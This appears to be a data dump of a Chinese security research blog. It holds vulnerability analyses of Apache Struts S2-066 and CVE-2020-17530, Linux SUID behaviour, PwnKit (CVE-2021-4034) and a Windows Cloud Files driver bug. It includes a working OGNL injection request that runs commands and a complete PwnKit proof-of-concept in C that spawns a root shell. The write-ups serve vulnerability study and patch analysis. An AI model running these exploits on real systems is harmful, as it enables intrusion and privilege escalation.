--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- 小结 这个漏洞巧妙地利用了struts中对属性的规范化和Map存储顺序，利用参数绑定巧妙地绕过了目录穿越的过滤，成功进行变量覆盖，从而进行目录穿越，可以利用目录穿越在敏感目录写入webshell，达成远程代码执行。\n而在补丁中在使用appendAll之前会调用remove方法，remove方法会忽略大小写，如果存在相同的参数则移除之前，所以当使用小写方式尝试利用时，在appendAll方法内会先移除存在的uploadFileName项，从而避免了后续的变量覆盖。 参考链接\nhttps://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)\nhttps://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/\nCreated at 2023-12-12T11:18:52+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"漏洞分析","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/linux/","title":"linux","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/research/linux/suid/","title":"Suid","tags":["安全研究","linux"],"description":"","content":"简介 SUID全称Set owner User ID up on execution，是Linux给可执行文件的一个属性，设置了s位的程序在运行时其Effective UID将会设置为这个程序的所有者。比如，/bin/ping这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其Effective UID就是0，等同于拥有了root权限。\n➜ c ls -ldb $(which pkexec) -rwsr-xr-x 1 root root 30872 2023年 2月13日 /usr/bin/pkexec SUID文件的出现是为了解决一些操作只能由root权限进行，但普通权限用户也需要能通过某种方式进行调用，比如passwd，/etc/shadow只有root可写，但用户自己显然需要可以修改密码，所以passwd被设置为SUID程序，使得普通用户能通过passwd临时获取到修改shadow文件的能力。\n-rw-r----- 1 root shadow 1411 2023年 5月10日 /etc/shadow -rwsr-xr-x 1 root root 68248 2022年11月11日 /usr/bin/passwd Linux中每个用户都有独一无二的ID，称为UserID。 为进程定义了三个ID：\nReal UserID Effective UserID Saved UserID Real UserID：对于一个进程，这个ID是启动这个进程的用户的用户ID，这个ID定义了这个进程有权访问那些文件。 Effective UserID：通常这个ID和Real UserID相同，但有时会不一样，来允许非特权用户访问只能由特权用户访问的文件。 当非特权的用户运行此文件时，euid是文件所属的用户id，ruid才是当前用户的id -rwsr-xr-x 1 root root 68248 2022年11月11日 /usr/bin/passwd ┌──(chestnut㉿chestnut)-[/root/code/c] └─$ passwd 为 chestnut 更改 STRESS 密码。 ➜ c ps -eo pid,euid,ruid | grep 1692693 1692693 0 1000 Saved UserID，当进程以提升权限运行时，需要做一些非特权的操作，可以通过临时切换到非特权账户来实现。 在执行低权限工作时，将Effective UID 更改为某个较低的权限值，并将 euid 保存到Saved userID（suid），以便在任务完成时用于切换回特权帐户。 https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/\n查找SUID程序\nfind / -perm -4000 -type f -exec ls -ldb {} \\; -perm -4000 查找权限为4000 -type f 只查找普通文件,过滤掉目录等其他类型 -[/root/code/c/suid.c /root/code/c/CMakeLists.txt](vscode-remote://ssh-remote%2B192.168.59.211/root/code/c/suid.c)exec ls -ldb {} ; 对找到的文件执行ls -ldb命令,显示文件详细信息。 {}表示find找到的文件名,会逐个代入。 ;表示-exec选项命令结束。 ; 的作用就是隔离 find 命令行和 -exec 指定的命令,避免解析错误。 -rwsr-xr-x 1 root root 30872 2023年 2月13日 /usr/bin/pkexec -rwsr-xr-x 1 root root 14888 2023年 1月 3日 /usr/bin/vmware-user-suid-wrapper -rwsr-xr-- 1 root kismet 146216 2022年12月27日 /usr/bin/kismet_cap_nxp_kw41z -rwsr-xr-- 1 root kismet 142120 2022年12月27日 /usr/bin/kismet_cap_nrf_51822 -rwsr-xr-x 1 root root 59704 2023年 2月13日 /usr/bin/mount -rwsr-xr-- 1 root kismet 216392 2022年12月27日 /usr/bin/kismet_cap_linux_wifi -rwsr-xr-- 1 root kismet 142120 2022年12月27日 /usr/bin/kismet_cap_ubertooth_one -rwsr-xr-- 1 root kismet 146216 2022年12月27日 /usr/bin/kismet_cap_rz_killerbee -rwsr-xr-x 1 root root 68248 2022年11月11日 /usr/bin/passwd -rwsr-xr-- 1 root kismet 146216 2022年12月27日 /usr/bin/kismet_cap_nrf_mousejack -rwsr-xr-- 1 root kismet 142120 2022年12月27日 /usr/bin/kismet_cap_nrf_52840 -rwsr-xr-x 1 root root 88496 2022年11月11日 /usr/bin/gpasswd -rwsr-xr-x 1 root root 35128 2023年 2月13日 /usr/bin/umount -rwsr-xr-- 1 root kismet 154408 2022年12月27日 /usr/bin/kismet_cap_linux_bluetooth -rwsr-xr-- 1 root kismet 146216 2022年12月27日 /usr/bin/kismet_cap_ti_cc_2531 shell中的SUID细节 在\rhttps://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html中提到Ubuntu对dash进行了patch。 找到patch地址为\rhttps://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz，代码如下，当on=1时会略过权限检查，当on不为1时，会通过geteuid和getegid获取当前进程的effective user ID和effective group ID，并与通过getuid和getgid获取的real user ID和real group ID进行比较。 如果当前进程对应的可执行文件为SUID文件且当前运行这个文件的用户不是文件属主时，会重新通过setuid和setgid将当前进程的权限设置为real ID，即运行这个可执行文件的用户的权限。 当文件不是SUID文件时rid和eid相等，不会进入if内，或者文件是SUID文件并且运行这个文件的用户是文件属主rid和eid也会相等，不会进入if内。\n+diff -Naurp dash-0.5.7.ori/src/main.c dash-0.5.7/src/main.c +--- dash-0.5.7.ori/src/main.c\t2015-06-03 10:45:22.766472281 -0400 ++++ dash-0.5.7/src/main.c\t2015-06-03 10:58:56.484258181 -0400 +@@ -97,11 +97,16 @@ main(int argc, char **argv) + struct jmploc jmploc; + struct stackmark smark; + int login; ++\tuid_t uid; ++\tgid_t gid; + + #ifdef __GLIBC__ + dash_errno = __errno_location(); + #endif + ++\tuid = getuid(); ++\tgid = getgid(); +diff -Naurp dash-0.5.7.ori/src/priv.c dash-0.5.7/src/priv.c +--- dash-0.5.7.ori/src/priv.c\t1969-12-31 19:00:00.000000000 -0500 ++++ dash-0.5.7/src/priv.c\t2015-06-03 11:00:31.097386153 -0400 +@@ -0,0 +1,27 @@ ++#include \u0026lt;unistd.h\u0026gt; ++ ++#include \u0026#34;priv.h\u0026#34; ++#include \u0026#34;var.h\u0026#34; ++ ++uid_t uid; ++gid_t gid; ++ ++void setprivileged(int on) ++{ ++\tstatic int is_privileged = 1; ++\tif (is_privileged == on) ++\treturn; ++ ++\tis_privileged = on; ++ ++\t/* ++\t* To limit bogus system(3) or popen(3) calls in setuid binaries, require ++\t* -p flag to work in this situation. ++\t*/ ++\tif (!on \u0026amp;\u0026amp; (uid != geteuid() || gid != getegid())) { ++\tsetuid(uid); ++\tsetgid(gid); ++\t/* PS1 might need to be changed accordingly. */ ++\tchoose_ps1(); ++\t} ++} 那么为什么要这样实现呢？为什么如果需要继承默认的effective user ID和effective group ID需要显式的使用-p参数呢？ 假设我们有如下suid程序，并且该程序由www-data用户启动：\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { printf(\u0026#34;%s\\n\u0026#34;, argv[1]); return system(argv[1]); } 其中通过system函数执行用户传入的命令，system实现可以\r在这找到，可以看到实际执行的是/bin/sh -c command，加入攻击者传入恶意命令，尝试通过该程序以root权限执行命令，最终以/bin/sh -c command的形式执行命令。\n#define\tSHELL_PATH\t\u0026#34;/bin/sh\u0026#34;\t/* Path of the shell. */ #define\tSHELL_NAME\t\u0026#34;sh\u0026#34;\t/* Name to give it. */ do_system (const char *line) { int status = -1; int ret; pid_t pid; struct sigaction sa; #ifndef _LIBC_REENTRANT struct sigaction intr, quit; #endif ..... __posix_spawnattr_init (\u0026amp;spawn_attr); __posix_spawnattr_setsigmask (\u0026amp;spawn_attr, \u0026amp;omask); __posix_spawnattr_setsigdefault (\u0026amp;spawn_attr, \u0026amp;reset); __posix_spawnattr_setflags (\u0026amp;spawn_attr, POSIX_SPAWN_SETSIGDEF | POSIX_SPAWN_SETSIGMASK); ret = __posix_spawn (\u0026amp;pid, SHELL_PATH, 0, \u0026amp;spawn_attr, (char *const[]){ (char *) SHELL_NAME, (char *) \u0026#34;-c\u0026#34;, (char *) line, NULL }, __environ); 如果没有前面说的措施，那么攻击者可以成功以root权限执行恶意命令，但通过上面的措施，则会出现如下：因为进程的rid为www-data，eid为root，而通过system函数执行命令不能显式设置-p参数，导致在执行命令时，不能通过if判断，命令的权限会被降为www-data权限，从而一定程度上缓解了攻击。\n参考资料\nhttps://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html\nCreated at 2023-12-08T10:30:07+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/","title":"CVE-2020-17530 Apache Struts OGNL RCE分析","tags":["漏洞分析"],"description":"","content":"基本信息 Struts2 会对某些标签属性(比如 id，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。\n影响版本 struts 2.0.0 - struts 2.5.25 环境搭建 使用docker compose启动容器，在docker-compose.yml中加入如下：\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 而后使用IDEA开启远程调试，对于JAVA8，需要去除address的*:\n技术分析\u0026amp;调试 静态分析 首先分析PoC，观察PoC可以知道，PoC通过表达式声明了instancemanager变量，类型为org.apache.tomcat.InstanceManager，而后通过instancemanager.newInstance实例化org.apache.commons.collections.BeanMap对象，并通过bean.setBean方法将com.opensymphony.xwork2.util.ValueStack.ValueStack设置到bean中。\nPOST /index.action HTTP/1.1 Host: 192.168.59.211:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.59.211:8080/.action;jsessionid=node010obz75lhtwqg1daa8msd7zvl70.node0 Connection: close Cookie: i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node014s7soaddt6u41im2x0qfyngjk1.node0 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 827 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\u0026#34;id\u0026#34; %{(#instancemanager=#application[\u0026#34;org.apache.tomcat.InstanceManager\u0026#34;]).(#stack=#attr[\u0026#34;com.opensymphony.xwork2.util.ValueStack.ValueStack\u0026#34;]).(#bean=#instancemanager.newInstance(\u0026#34;org.apache.commons.collections.BeanMap\u0026#34;)).(#bean.setBean(#stack)).(#context=#bean.get(\u0026#34;context\u0026#34;)).(#bean.setBean(#context)).(#macc=#bean.get(\u0026#34;memberAccess\u0026#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\u0026#34;java.util.HashSet\u0026#34;)).(#bean.put(\u0026#34;excludedClasses\u0026#34;,#emptyset)).(#bean.put(\u0026#34;excludedPackageNames\u0026#34;,#emptyset)).(#arglist=#instancemanager.newInstance(\u0026#34;java.util.ArrayList\u0026#34;)).(#arglist.add(\u0026#34;id\u0026#34;)).(#execute=#instancemanager.newInstance(\u0026#34;freemarker.template.utility.Execute\u0026#34;)).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- com.opensymphony.xwork2.util.ValueStack.ValueStack中存储了当前请求相关的一些对象，如下图解释，来自\rhttps://www.cnblogs.com/xtdxs/p/6527380.html 而后分别通过bean.setBean和bean.get获取到了对象获取到了com.opensymphony.xwork2.util.ValueStack.ValueStack.context，实际上就是下面这个对象\n继续通过以上方式使用bean.get获取SecurityMemberAccess对象，而后通过bean.put方法设置SecurityMemberAccess.excludedPackageNames和SecurityMemberAccess.excludedClasses为空。\n最后通过freemarker.template.utility.Execute.exec执行Shell 命令。\n整体来看，该漏洞利用思路是通过Bean的get/set方法间接获取到OgnlContext，而后通过OgnlContext获取到SecurityMemberAccess对象并把里面的黑名单置空，最后调用黑名单中的freemarker.template.utility.Execute.exec执行命令。\n动态调试 使用docker启动环境后，拷贝里面的关键jar包，新建IDEA项目，导入jar包，开启远程调试。\n在org.apache.commons.collections.BeanMap构造函数下断点，运行PoC，IDEA断下，可以看到有如下\n调用栈如下：\n在compileAndExecute:523, OgnlUtil (com.opensymphony.xwork2.ognl)中看到传入的payload已经被解析为了AST链。 而后在getValueBody:141, ASTChain (ognl) [1]通过循环，遍历处理\nprotected Object getValueBody(OgnlContext context, Object source) throws OgnlException { Object result = source; int i = 0; for(int ilast = this._children.length - 1; i \u0026lt;= ilast; ++i) { boolean handled = false; if (i \u0026lt; ilast \u0026amp;\u0026amp; this._children[i] instanceof ASTProperty) { ASTProperty propertyNode = (ASTProperty)this._children[i]; int indexType = propertyNode.getIndexedPropertyType(context, result); if (indexType != OgnlRuntime.INDEXED_PROPERTY_NONE \u0026amp;\u0026amp; this._children[i + 1] instanceof ASTProperty) { ASTProperty indexNode = (ASTProperty)this._children[i + 1]; if (indexNode.isIndexedAccess()) { Object index = indexNode.getProperty(context, result); if (index instanceof DynamicSubscript) { if (indexType == OgnlRuntime.INDEXED_PROPERTY_INT) { ...... } } else if (indexType == OgnlRuntime.INDEXED_PROPERTY_OBJECT) { throw new OgnlException(\u0026#34;DynamicSubscript \u0026#39;\u0026#34; + indexNode + \u0026#34;\u0026#39; not allowed for object indexed property \u0026#39;\u0026#34; + propertyNode + \u0026#34;\u0026#39;\u0026#34;); } } if (!handled) { result = OgnlRuntime.getIndexedProperty(context, result, propertyNode.getProperty(context, result).toString(), index); handled = true; ++i; } } } } if (!handled) { result = this._children[i].getValue(context, result); } } return result; } 继续运行，IDEA在setBean:536, BeanMap (org.apache.commons.collections)断下，此时通过setBean将context存到bean对象中 在initialise方法中会将PoC中传入的valueStack分为name和对应的get方法存储到HashMap中，可以看到context对应于public java.util.Map com.opensymphony.xwork2.ognl.OgnlValueStack.getContext()\n而后在通过bean.get获取到context，前面知道context对应于getContext方法，通过调用这个方法获取到了stack中的context。 再次通过bean.setBean存储到bean中 通过bean获取memverAccess，对应SecurityMemberAccess对象 可以看到在其中已有预先初始化的黑名单类和包名，其中包括后面执行命令使用的freemarker.template 在com.opensymphony.xwork2.ognl.isAccessible下断点，可以看到在每次执行Ognl表达式之前都会检查包名和类名是否在黑名单内 此时调用栈如下 而后通过bean.put将黑名单覆盖后，在使用#execute=#instancemanager.newInstance(\u0026quot;freemarker.template.utility.Execute\u0026quot;)).(#execute.exec(#arglist)时黑名单已经是空集了，直接通过了校验。\n而后在freemarker.template.utility.Execute.exec方法中直接通过调用Runtime.getRuntime().exec(aExecute)执行系统命令。 Diff对比\n在\r0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e对比可知当字符串中不包含表达式时才会添加%{} 并且限制了解析tag时的不安全行为 同时将一些危险类加入黑名单中\rhttps://github.com/apache/struts/commit/482af41673a3883e904ea72391a5b4a03cbd5d94 小结 这个漏洞利用了OGNL表达式的二次解析，注入OGNL表达式，巧妙地利用tomcat容器中的Bean类获取OGNL context，并通过Bean类的get/setBean方法重置黑名单，而后利用黑名单中的类执行任意命令。\n参考链接\nhttps://www.anquanke.com/post/id/225252\nCreated at 2023-12-04T19:21:08+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/","title":"CVE-2021-4034 Polkit 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Polkit是一个用于在类Unix操作系统中控制系统范围权限的组件，它为非特权进程与特权进程提供了一种通信方式。Polkit中的pkexec应用程序旨在允许非特权用户根据预定义的策略以特权用户身份运行命令。 Polkit pkexec存在本地权限提升漏洞。由于pkexec无法正确处理调用参数计数，攻击者可以通过制作环境变量来诱导pkexec执行任意代码。具有低权限的攻击者可以利用此漏洞绕过pkexec自带的安全保护措施，获取目标机器的ROOT权限。\n影响版本 Polkit默认安装在多个主流Linux系统上，由2009年5月发布的第一个版本引入，并影响后续所有版本。以下为CentOS及Ubuntu上的安全版本： CentOS系列： CentOS 6：polkit-0.96-11.el6_10.2 CentOS 7：polkit-0.112-26.el7_9.1 CentOS 8.0：polkit-0.115-13.el8_5.1 CentOS 8.2：polkit-0.115-11.el8_2.2 CentOS 8.4：polkit-0.115-11.el8_4.2 Ubuntu系列： Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2 Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6 Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1 Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1 环境搭建 技术分析\u0026amp;调试 在\r源码中可以看到如下：n被赋值为1，而后通过g_strdup函数在堆内分配内存并将argv[n]复制进去，将分配到内存地址返回给path变量。当不加任何参数时，argv数组只有一个元素，而argv[1]实际指向envp[0]，也就是会把环境变量的第一个复制给path变量\nfor (n = 1; n \u0026lt; (guint) argc; n++) { if (strcmp (argv[n], \u0026#34;--help\u0026#34;) == 0) { opt_show_help = TRUE; } else if (strcmp (argv[n], \u0026#34;--version\u0026#34;) == 0) { opt_show_version = TRUE; } else if (strcmp (argv[n], \u0026#34;--user\u0026#34;) == 0 || strcmp (argv[n], \u0026#34;-u\u0026#34;) == 0) { ..... { g_printerr (\u0026#34;--user specified twice\\n\u0026#34;); goto out; } opt_user = g_strdup (argv[n]); } else if (strcmp (argv[n], \u0026#34;--disable-internal-agent\u0026#34;) == 0) ..... } ..... /* Now figure out the command-line to run - argv is guaranteed to be NULL-terminated, see * * http://lkml.indiana.edu/hypermail/linux/kernel/0409.2/0287.html * * but do check this is the case. * * We also try to locate the program in the path if a non-absolute path is given. */ g_assert (argv[argc] == NULL); path = g_strdup (argv[n]); 而后如果envp[0]!='/'则会通过g_find_program_in_path在PATH环境变量内的目录中寻找第一个名字为path变量的可执行文件，并分配内存存储其绝对路径，没找到则会返回NULL。 再找到之后会将其写入到argv[n]，前面说过当没有传入命令行参数时，n为1 argv[1]指向envp[0]，也就是我们可以通过控制执行pkexec的环境变量，在pkexec执行时注入环境变量。\nif (path[0] != \u0026#39;/\u0026#39;) { /* g_find_program_in_path() is not suspectible to attacks via the environment */ s = g_find_program_in_path (path); if (s == NULL) { g_printerr (\u0026#34;Cannot run program %s: %s\\n\u0026#34;, path, strerror (ENOENT)); goto out; } g_free (path); argv[n] = path = s; } 那为什么要绕这么大一圈来注入环境变量呢，直接在execve时通过envp参数注入呗。 在\rglibc.so实现中有如下代码：循环遍历unsecure_envvars，并且尝试调用unsetenv来取消该环境变量(如果有的话)。\nif (__libc_enable_secure) { static const char unsecure_envvars[] = UNSECURE_ENVVARS #ifdef EXTRA_UNSECURE_ENVVARS EXTRA_UNSECURE_ENVVARS #endif ; const char *cp = unsecure_envvars; while (cp \u0026lt; unsecure_envvars + sizeof (unsecure_envvars)) { __unsetenv (cp); cp = (const char *) __rawmemchr (cp, \u0026#39;\\0\u0026#39;) + 1; } unsecure_envvars定义在\rhttps://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html这些环境变量能够引入外部so，从而在执行程序的时候执行恶意代码，这在执行suid程序时是不安全的，所以glibc在初始化时就将这些环境变量去除了除非程序主动setenv。\n#define UNSECURE_ENVVARS \\ \u0026#34;GCONV_PATH\\0\u0026#34;\t\\ \u0026#34;GETCONF_DIR\\0\u0026#34;\t\\ GLIBC_TUNABLES_ENVVAR\t\\ \u0026#34;HOSTALIASES\\0\u0026#34;\t\\ \u0026#34;LD_AUDIT\\0\u0026#34;\t\\ \u0026#34;LD_DEBUG\\0\u0026#34;\t\\ \u0026#34;LD_DEBUG_OUTPUT\\0\u0026#34;\t\\ \u0026#34;LD_DYNAMIC_WEAK\\0\u0026#34;\t\\ \u0026#34;LD_HWCAP_MASK\\0\u0026#34;\t\\ \u0026#34;LD_LIBRARY_PATH\\0\u0026#34;\t\\ \u0026#34;LD_ORIGIN_PATH\\0\u0026#34;\t\\ \u0026#34;LD_PRELOAD\\0\u0026#34;\t\\ \u0026#34;LD_PROFILE\\0\u0026#34;\t\\ \u0026#34;LD_SHOW_AUXV\\0\u0026#34;\t\\ \u0026#34;LD_USE_LOAD_BIAS\\0\u0026#34;\t\\ \u0026#34;LOCALDOMAIN\\0\u0026#34;\t\\ \u0026#34;LOCPATH\\0\u0026#34;\t\\ \u0026#34;MALLOC_TRACE\\0\u0026#34;\t\\ \u0026#34;NIS_PATH\\0\u0026#34;\t\\ \u0026#34;NLSPATH\\0\u0026#34;\t\\ \u0026#34;RESOLV_HOST_CONF\\0\u0026#34;\t\\ \u0026#34;RES_OPTIONS\\0\u0026#34;\t\\ \u0026#34;TMPDIR\\0\u0026#34;\t\\ \u0026#34;TZDIR\\0\u0026#34; 如何触发加载，代码中有如下在循环中会遍历environment_variables_to_save并获取对应的环境变量的值，传入到validate_environment_variable函数中。 validate_environment_variable函数会验证SHELL和XAUTHORITY环境变量是否合法，当SHELL环境变量不属于/etc/shells中的任意一个则会调用g_printerr，或者XAUTHORITY环境变量中包含%或..也会调用g_printerr\nconst gchar *environment_variables_to_save[] = { \u0026#34;SHELL\u0026#34;, \u0026#34;LANG\u0026#34;, \u0026#34;LINGUAS\u0026#34;, \u0026#34;LANGUAGE\u0026#34;, \u0026#34;LC_COLLATE\u0026#34;, \u0026#34;LC_CTYPE\u0026#34;, \u0026#34;LC_MESSAGES\u0026#34;, \u0026#34;LC_MONETARY\u0026#34;, \u0026#34;LC_NUMERIC\u0026#34;, \u0026#34;LC_TIME\u0026#34;, \u0026#34;LC_ALL\u0026#34;, \u0026#34;TERM\u0026#34;, \u0026#34;COLORTERM\u0026#34;, \u0026#34;DISPLAY\u0026#34;, \u0026#34;XAUTHORITY\u0026#34;, NULL }; saved_env = g_ptr_array_new (); for (n = 0; environment_variables_to_save[n] != NULL; n++) { const gchar *key = environment_variables_to_save[n]; const gchar *value; value = g_getenv (key); if (value == NULL) continue; /* To qualify for the paranoia goldstar - we validate the value of each * environment variable passed through - this is to attempt to avoid * exploits in (potentially broken) programs launched via pkexec(1). */ if (!validate_environment_variable (key, value)) goto out; g_ptr_array_add (saved_env, g_strdup (key)); g_ptr_array_add (saved_env, g_strdup (value)); } validate_environment_variable (const gchar *key, const gchar *value) { gboolean ret; /* Generally we bail if any environment variable value contains * * - \u0026#39;/\u0026#39; characters * - \u0026#39;%\u0026#39; characters * - \u0026#39;..\u0026#39; substrings */ g_return_val_if_fail (key != NULL, FALSE); g_return_val_if_fail (value != NULL, FALSE); ret = FALSE; /* special case $SHELL */ if (g_strcmp0 (key, \u0026#34;SHELL\u0026#34;) == 0) { /* check if it\u0026#39;s in /etc/shells */ if (!is_valid_shell (value)) { log_message (LOG_CRIT, TRUE, \u0026#34;The value for the SHELL variable was not found the /etc/shells file\u0026#34;); g_printerr (\u0026#34;\\n\u0026#34; \u0026#34;This incident has been reported.\\n\u0026#34;); goto out; } } else if ((g_strcmp0 (key, \u0026#34;XAUTHORITY\u0026#34;) != 0 \u0026amp;\u0026amp; strstr (value, \u0026#34;/\u0026#34;) != NULL) || strstr (value, \u0026#34;%\u0026#34;) != NULL || strstr (value, \u0026#34;..\u0026#34;) != NULL) { log_message (LOG_CRIT, TRUE, \u0026#34;The value for environment variable %s contains suscipious content\u0026#34;, key); g_printerr (\u0026#34;\\n\u0026#34; \u0026#34;This incident has been reported.\\n\u0026#34;); goto out; } ret = TRUE; out: return ret; } /etc/shells文件内容如下：\n➜ c cat /etc/shells # /etc/shells: valid login shells /bin/sh /bin/bash /usr/bin/bash /bin/rbash /usr/bin/rbash /bin/dash /usr/bin/dash /usr/bin/pwsh /opt/microsoft/powershell/7/pwsh /usr/bin/tmux /usr/bin/screen /bin/zsh /usr/bin/zsh /usr/bin/zsh 触发路径\n当CHARSET环境变量不是UTF-8时，g_printerr不能正确打印错误消息到stderr，为了将错误消息转化为其他字符集，g_printerr会调用iconv_open()，iconv_open()会执行共享库，并且读取默认配置文件/usr/lib/gconv/gconv-modules，当GCONV_PATH环境变量存在时，可以强制iconv_open()使用GCONV_PATH指向的目录中读取gconv-modules配置文件。\n因此利用可以构造如下环境变量，在通过execve启动时，pwnkit会传递给g_find_program_in_path函数，尝试在PATH指向的目录中寻找名为pwnkit的可执行程序，此时会找到GCONV_PATH=./pwnkit，并将其赋值给argv[1]实际上是envp[0]向pkexec注入了一个环境变量。\nchar *env[] = { \u0026#34;pwnkit\u0026#34;, \u0026#34;PATH=GCONV_PATH=.\u0026#34;, \u0026#34;CHARSET=PWNKIT\u0026#34;, \u0026#34;SHELL=pwnkit\u0026#34;, NULL }; 而后由于CHARSET不是UTF-8，在SHELL触发g_printerr，g_printerr会调用iconv_open()函数，由于注入了环境变量GCONV_PATH，iconv_open函数会尝试在GCONV_PATH指向的目录，即./pwnkit目录下读取gconv-modules文件，此时./pwnkit/gconv-modules已经被覆盖为如下内容：\nmodule UTF-8// PWNKIT// pwnkit 1 这个配置文件指示iconv_open()，当尝试从UTF-8向PWNKIT转换时应该加载pwnkit.so，而CHARSET即目标字符集已经被设置为PWNKIT，所以会尝试加载pwnkit.so，只需要使我们的so在pwnkit/pwnkit.so目录即可使得pkexec以root权限加载我们的恶意so，达成提权。\n漏洞修复\n前面分析知道触发漏洞需要argc=0，所以在程序启动时监测argc\u0026lt;1就直接退出了\nif (argc\u0026lt;1) { exit(127); } PoC\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char *shell = \u0026#34;#include \u0026lt;stdio.h\u0026gt;\\n\u0026#34; \u0026#34;#include \u0026lt;stdlib.h\u0026gt;\\n\u0026#34; \u0026#34;#include \u0026lt;unistd.h\u0026gt;\\n\\n\u0026#34; \u0026#34;void gconv() {}\\n\u0026#34; \u0026#34;void gconv_init() {\\n\u0026#34; \u0026#34; setuid(0); setgid(0);\\n\u0026#34; \u0026#34; seteuid(0); setegid(0);\\n\u0026#34; \u0026#34; system(\\\u0026#34;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh\\\u0026#34;);\\n\u0026#34; \u0026#34; exit(0);\\n\u0026#34; \u0026#34;}\u0026#34;; int main(int argc, char *argv[]) { FILE *fp; system(\u0026#34;mkdir -p \u0026#39;GCONV_PATH=.\u0026#39;; touch \u0026#39;GCONV_PATH=./pwnkit\u0026#39;; chmod a+x \u0026#39;GCONV_PATH=./pwnkit\u0026#39;\u0026#34;); system(\u0026#34;mkdir -p pwnkit; echo \u0026#39;module UTF-8// PWNKIT// pwnkit 1\u0026#39; \u0026gt; pwnkit/gconv-modules\u0026#34;); fp = fopen(\u0026#34;pwnkit/pwnkit.c\u0026#34;, \u0026#34;w\u0026#34;); fprintf(fp, \u0026#34;%s\u0026#34;, shell); fclose(fp); system(\u0026#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC\u0026#34;); char *env[] = { \u0026#34;pwnkit\u0026#34;, \u0026#34;PATH=GCONV_PATH=.\u0026#34;, \u0026#34;CHARSET=PWNKIT\u0026#34;, \u0026#34;SHELL=pwnkit\u0026#34;, NULL }; execve(\u0026#34;./pkexec_105\u0026#34;, (char*[]){NULL}, env); } 小结 这个漏洞虽然是溢出漏洞，但更类似于逻辑漏洞，不需要为特定操作系统进行布局，只需要构造恶意环境变量组即可注入恶意环境变量，整体利用较为简单。\n参考链接\nhttps://xz.aliyun.com/t/10870\nhttps://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\nCreated at 2023-11-30T14:25:08+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/","title":"CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Windows Cloud Files Mini Filter 驱动中存在越界写入漏洞，在解析Reparse point数据时，由于memcpy函数的长度参数用户可控，源内存可控，导致攻击者可以构造恶意结构并传递给Windows Cloud Files Mini Filter 驱动，造成越界写入，并在内核执行任意代码。\n影响版本 略\n环境搭建 Windows 10 23年10月补丁 技术分析\u0026amp;调试 cldflt.sys驱动中实现了云文件的各项功能，diff该驱动，修改函数如下：\n在HsmpRpiDecompressBuffer函数中有如下修改，对*(_WORD *)(a1 + 10)添加了一个判断，是否\u0026gt;0x4000，\n如果大于则抛出错误 0xC000CF02对应 STATUS_CLOUD_FILE_METADATA_CORRUPT\nhttps://endodermis59.rssing.com/chan-36587470/all_p6.html\nAI输出\nHsmpRpiDecompressBuffer函数的作用是解压压缩后的Reparse Point数据。 主要功能包括: 1. 校验传入数据的完整性和魔数是否正确 2. 如果数据被压缩,则根据原长度分配解压缓冲区 3. 调用RtlDecompressBuffer进行实际解压 4. 检查解压后数据长度是否匹配 5. 如果解压成功,返回解压后的数据 6. 否则返回错误码 所以它是一个典型的压缩数据解压函数,接收原始压缩数据,校验-\u0026gt;分配缓冲区-\u0026gt;解压-\u0026gt;返回解压后数据的过程。 通过解压让后续代码可以处理未压缩的Reparse 